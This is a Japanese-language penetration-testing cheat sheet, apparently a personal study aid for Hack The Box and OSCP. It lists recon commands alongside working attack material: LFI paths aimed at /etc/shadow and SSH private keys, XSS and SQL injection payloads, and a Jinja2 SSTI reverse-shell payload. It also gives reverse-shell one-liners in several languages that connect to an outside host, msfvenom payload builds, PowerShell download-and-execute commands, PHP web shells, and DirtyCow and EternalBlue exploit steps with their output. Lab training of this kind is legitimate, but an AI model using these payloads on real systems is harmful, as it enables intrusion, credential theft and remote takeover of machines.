# ペネトレーションテスト用チートシート
Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
随時更新して成長していきます。

<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">

Twitter:@yukitsukai1731

# Enum
## FTP(21)
```
ログインユーザの指定...user (ユーザ名) (パスワード)
ファイル転送モードを指定...type (転送モード)
```
|  コマンド  |  説明  |
| ---- | ---- |
|  USER (username)<br>PASS (password)  |  ログイン情報の記述。  |
|  get (リモートファイル名) (ローカルファイル名)  |  	サーバのファイルをパソコンに転送。  |
|  mget (リモートファイル名 [...])  |  サーバの複数のファイルをパソコンに転送。 |
|  mput (ローカルファイル名 [...])  |  パソコンの複数のファイルをサーバに転送。 |
|  put (ローカルファイル名) (リモートファイル名)  | パソコンのファイルをサーバに転送。 |
|  type (転送モード)  |  	現在のファイル転送モードを表示。  |

## SSH(22)
### SCP
カレントディレクトリにsecret.zipをダウンロード
```
kali@kali:$ scp charix@10.10.10.84:/home/charix/secret.zip .
```

### SSHポートフォワーディング
```
kali@kali:$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

### ssh-keygen
```
ssh-keygen -t rsa -f id_rsa
chmod 600 id_rsa
```
- -t...暗号の種類(ed25519,rsaなど)
- -b...ビット数の固定(-t rsa -b 4096など)
- -f...ファイル名(id_????の?部分)

### 公開鍵認証
```
ssh -i id_rsa root@10.10.10.1
```

## DNS(53)
未完了

## HTTP(80)
### Nmap
```
kali@kali:$ nmap -sC -sV -oN nmap/initial <ipアドレス>
```
```
kali@kali:$ sudo nmap -T5 -p- -oN nmap/full <ipアドレス>
```
```
kali@kali:$ nmap --script http-enum <ipアドレス>　-p 80
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
```


### Gobuster
```
gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py -o <output filename> -k
```
-dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定
- -k...Skip SSL
- -s...ステータスコードの指定

### ffuf
未完了

### Nikto
```
nikto -h <url> -Format txt -o <output filename>
```
- -h...url指定
- Format...出力するファイルの拡張子を指定
- -o...ファイルへ出力する
- -ssl...SSLを使用するサイトで使用

### WPScan
パッシブスキャン
```
wpscan --update
wpscan --url <url> -e vp #脆弱なプラグイン特定
wpscan --url <url> -e vt #脆弱なTheme特定
wpscan --url <url> -e u #ユーザの列挙
wpscan --url <url> -e u -t -vp --log <output filename>
```
アグレッシブスキャン
```
wpscan --url <url> -e vp --plugins-detection aggressive
```
- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力

#### リスト型攻撃/パスワード推測攻撃
```
wpscan --url <url> -U <ユーザ名> -P <辞書ファイル> --password-attack <攻撃タイプ>
#攻撃タイプ：wp-login,xmlrpc,xmlrpc-multicall
```
- --force...「but does not seem to be running WordPress」などが出た際に警告を無視して強制的に実行する

### BurpSuite
ローカルプロキシツール。  
通信の改ざんをするために使用。  
他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。  
LFIなどを利用する時にも使用。  

![](./image/2021-05-06-17-25-26.png)


### robots.txtの確認
```
curl http://<IPアドレス>robots.txt
```

### /etc/hostsファイルの編集
```
sudo emacs /etc/hosts
10.10.10.1  admin.htb
```

### LFI
```
http://<url>/script.php?page=../../../../../../../../etc/passwd
http://<url>/script.php?page=../../../../../../../../etc/hosts
```

Examples: 
```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

LFIを利用して読み取りを狙うファイル:  
Linux:
```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
```

Windows:
```
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/S
```
### XSS
```
<script>alert(1);</script>
"><script>alert(1);</script>
<a onmouseover="alert(document.cookie)">XSS</a>
<iframe src="javascript:alert('XSS');"></iframe>
<IMG SRC=j&#X41vascript:alert('XSS')>
```

### SQLインジェクション
・後ろのスペースを入れて使用
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1--
'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
```

SQLmap:
```
sqlmap -u http://192.168.56.1/vuln.php?id=1
sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
```

### SSTI(サーバサイドテンプレートインジェクション)
![](./image/2021-04-14-15-23-34.png)

・Jinja2(Reverse Shell)
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

### exiftools
・画像情報の表示
```
exiftool image.jpg
```

・画像ファイルにexiftoolを用いてコメントにリバースシェルペイロードを記述
```
exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ image.png
```

### steghide
・ステガノグラフィー
```
steghide extract -sf image.jpg
```

### CMS
- CMSの特定後、ログインページについて調査
- その後、まずはデフォルトパスワードを入力
- 次にSQLインジェクションを試す
- サーバ内で見つけたものなどを用いて、パスワード推測
- 最終的にHydraなどでブルートフォース

・WordPress
```
ログイン後、
1.[Appearance]→[Editor]→[404 Template(404.php)]を選択して編集
2.PentestMonkeyのphp-reverse-shellをコピーして上書き
3.netcatでリバースシェルを待ち受け
4.下記のようなアドレスにアクセス
  http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
```

・drupal
```
MySQLに接続するための認証情報が記述されている
/var/www/html/sites/default/settings.php

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

## SMB(445)
### smbclient
匿名ログインが有効になっているかの確認。
```
smbclient -L <target ip>
```

### impacket
ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。  
ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。

```
git clone https://github.com/SecureAuthCorp/impacket.git
pip install .
```

#### impacket-smbserver
対象サーバにツールを送り込む際に使用。  
主にnetcatもpowershellも使えないようなときに使う。  
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有するディレクトリ>
```

```
C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
```

### smbmap
ドメイン全体のsamba共有ドライブを列挙するために使用。
```
smbmap -u <username> -p <password> -H <target host ip>
```

### enum4linux
WindowsおよびSambaホストからのデータを列挙するためのツール。
```
enum4linux -U -o <target ip>
```
- -U...ユーザリスト取得
- -o...OS情報取得

## MySQL(3306)
ログイン
```
mysql -u root -p
mysql -u root -p -h <host name> -P <port number>
mysql -u root -e 'SHOW DATABASES;'
```
- -D...データベース名の指定
- -e...コマンドラインから直接SQLコマンドを実行
- -h... ホスト名の指定
- -p...パスワードの指定
- -u...ユーザー名の指定

データベース一覧の表示
```
mysql > show databases;
```

データベースの追加
```
mysql > create database sample_db;
```

テーブル一覧の表示
```
mysql > show tables;
```

ユーザ情報取得
```
SELECT Host, User, Password FROM mysql.user;
```

ユーザの追加
```
create user <追加するusername>@<host name> IDENTIFIED BY <password>;
```

権限付与
```
grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
```

# Exploitation
## Reverse Shell
Bash:
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Perl:
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PHP:
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php echo system($_REQUEST ["cmd"]); ?>
```

Ruby:
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Netcat:
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

PowerShell:
```
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"
```

## msfvenom
Windows
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

Windows(meterpreter):
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```

Linux:
```
msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
```
Linux(meterpreter):
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

PHP:
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
```

ASP:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```

JSP:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
```

WAR:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
```

Python:
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
```

Bash:
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
```

Perl:
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
```

### Handlers(meterpreter)
```
use exploit/multi/handler
set payload <payload>
set LHOST <ip address>
set LPORT <port number>
run
```

# Python HttpServer
攻撃者マシンでのサーバ立ち上げ。

```
python -m SimpleHTTPServer <ポート番号>
python3 -m http.server <ポート番号>
```

## Netcat
・ファイル転送  
```
送信側
nc <攻撃者のIPアドレス> 9999 < filename

受信側
nc -l -p 9999 > filename
```

・コマンドプロンプト
```
C:\Users\offsec> certutil -urlcache -split -f "http://10.11.0.4/wget.exe" wget.exe
```
・PowerShell
```
#ダウンロード
C:\Users\offsec> powershell -c (New-Object Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'wget.exe')
C:\Users\offsec> powershell -c Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
C:\Users\offsec> powershell -c wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

#ダウンロード&実行
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
```

## searchsploit
Exploit-dbを即座に検索できるツール。
```
searchsploit <keyword>
```

ターミナル上でコードを閲覧。
```
searchsploit - searchsploit -m windows/remote/39161.py
```

ローカルにコードやテキストをダウンロード。  
これでexploit用スクリプトをダウンロードする。
```
searchsploit -m searchsploit -m windows/remote/39161.py
```

## hashcat
```
hashcat -m 0 -a 0 <パスワードファイル>　/usr/share/wordlist/rockyou.txt
```
- -m 0 = MD5
- -a 0 = 辞書攻撃

Hash tyep:
https://hashcat.net/wiki/doku.php?id=example_hashes

## John The Ripper
・zip
```
zip2john a.zip > hash.txt
john hash.txt 
or
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```

・md5
```
john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
```

## hydra
・http login
```
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
```

・ssh
未完了

・ftp
未完了

## patator
未完了

## Wordlist
未完了


## aircrack-ng
```
airmon-ng start wlan0
iwaconfig
airodump-ng wlan0mon
```

```
airodump-ng --channel 対象のチャンネル --bssid APのMACアドレス -w <output filename> wlan0mon
```

```
aircrack-ng <filename>.cap
```

# Privilege Escalation
## Linux
### tty shell
```
python -c 'import pty;pty.spbaawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

・Ctrl+c,Ctrl+zなどを利用可能にする

```
stty raw -echo; fg
<Enter><Enter>
```

```
kali@kali:stty -a(結果を下のrows columns に代入)  
victim:stty rows 16 columns 136
```

・clearなどを可能にする
```
export TERM=xterm
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### enumツール
linpease.sh  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
LinEnum.sh  
https://github.com/rebootuser/LinEnum

### カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
```
uname -a
```

### sudoコマンド悪用して権限昇格
```
sudo -l
```

### Linuxで開いているすべてのポートを表示する方法
```
netstat -tulpn
netstat -an(linux以外)
```

### 実行中のプロセスを確認
```
ps -aux
```

### pspy
実行しているプロセスをダンプ。  
https://github.com/DominicBreuker/pspy


### ファイルの検索
```
find / -name <ファイル名> -type f 2>>/dev/null
```
- /...ファイルシステム全体を検索
- -name...名前の指定
- -type f...ディレクトリではなく、ファイル検索を指定
- 2>>/dev/null...全てのエラーを破棄

### SUID
Linuxでは、SUIDビットが有効になっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
まずはSUIDファイルを見つける。
下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```
- /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
- -permは、後続の権限の検索
- -u=sは、rootユーザーが所有するファイルを検索
- -typeは、探しているファイルの種類を示します
- fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す
- 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
- &gt;はリダイレクトを意味する
- /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト

列挙後、権限昇格に使えそうなものをGTFOで調べる  
https://gtfobins.github.io/

### chmod777に設定したfile/dirを検索
```
find / -type f -perm 777
```

### kernel exploit
#### dirtycow
・40839.c(dirty.c)
パスワードを自身で入力して、firefaltというアカウントを作成する
```
gcc -pthread dirty.c -o dirty -lcrypt
chmod 755 dirty
```
```
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: pass

Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash

mmap: b778e000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'pass'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'pass'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

・40616.c(cowroot.c)
実行するだけでrootになれる
```
gcc cowroot.c -o cowroot -pthread
```
```
* $ ./cowroot
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* Size of binary: 57048
* Racing, this may take a while..
* /usr/bin/passwd is overwritten
* Popping root shell.
* Don't forget to restore /tmp/bak
* thread stopped
* thread stopped
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
```

## Windows
### metasploit(local_exploit_suggester)
expploitをせずに脆弱性をチェックするために使用するモジュール。
meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。

```
use post/multi/recon/local_exploit_suggester
```
## windows
### windows-exploit-suggester
windowsでexploitを列挙するためのスクリプト
systeminfoコマンドの出力が必要
```
./windows-exploit-suggester.py --update
pip install xlrd
```

```
systeminfo > systeminfo.txt
./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
```

### evlilwinrm
WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
5985ポートが空いている時に使用。

#### インストール
```
gem install evil-winrm
```

#### 使い方
```
evil-winrm -u <username> -p <password> -i <remote host ip>
```

### MS17-010(EternalBlue)
エクスプロイトに必要なものを準備
この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。

```
wget https://www.exploit-db.com/raw/42315
mv 42315 eternalblue.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

もしもここでpipが入っていないと警告が出た場合は、

```
sudo apt install python-pip
```
をして、pipもインストール。

次にリバースシェルに使うペイロードをmsfvenomを利用して作成

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
```

次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。
まずUSERNAMEのところを下記の画像のように変更。

![](./image/2021-05-06-17-48-11.png)

次にsmb_pwn関数内のスクリプトを下記の画像のように変更。

![](./image/2021-05-06-17-48-54.png)

これで準備は完了
通信を受けるためにnetcatで待ち受けておく。

```
nc -lvp 1234
```

最後にeternalblue.pyを実行

```
┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001af9560
SESSION: 0xfffff8a001bf5de0
.
.
.
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
すると、通信を待ち受けていたnetcatの方でシェルが取得できる。

![](./image/2021-05-06-17-49-20.png)